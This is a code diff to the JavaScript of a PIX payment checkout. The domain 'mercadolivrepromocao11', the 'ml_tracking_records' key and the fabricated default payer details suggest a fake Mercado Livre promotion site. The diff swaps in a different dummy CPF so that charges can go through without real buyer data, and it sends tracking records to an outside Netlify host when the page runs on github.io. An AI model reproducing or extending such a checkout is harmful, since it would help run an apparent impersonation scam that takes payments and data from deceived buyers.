@@ -1049,7 +1049,7 @@
     }, getTracking());
   }
 
-  async function createPix() {
+    async function createPix() {
     const body = pixCreateBody();
     const amountFloat = Number(body.value || 0);
 
@@ -1063,7 +1063,7 @@
         name: body.payerName || 'Cliente JBL',
         email: body.payerEmail || 'contato@cliente.com',
         phone: body.payerPhone || '11999999999',
-        cpf: body.payerCpf || '11144477735'
+        cpf: body.payerCpf || '52998224725'
       },
       cep: body.payerZip,
       cidade: body.payerCity,
@@ -1195,7 +1195,7 @@
     });
   })();
 
-  function startPolling(txid) {
+    function startPolling(txid) {
     clearInterval(pollTimer);
     if (!txid) return;
     pollTimer = setInterval(async () => {
@@ -1292,7 +1292,7 @@
       localStorage.setItem('ml_tracking_records', JSON.stringify(_records));
 
       const _isLoc = location.hostname === 'localhost' || location.hostname === '127.0.0.1';
-      fetch(_isLoc ? '/api/tracking' : '/.netlify/functions/tracking', {
+      fetch(_isLoc ? '/api/tracking' : ((location.hostname.endsWith('github.io') ? 'https://mercadolivrepromocao11.netlify.app' : '') + '/.netlify/functions/tracking'), {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(_trackRec)
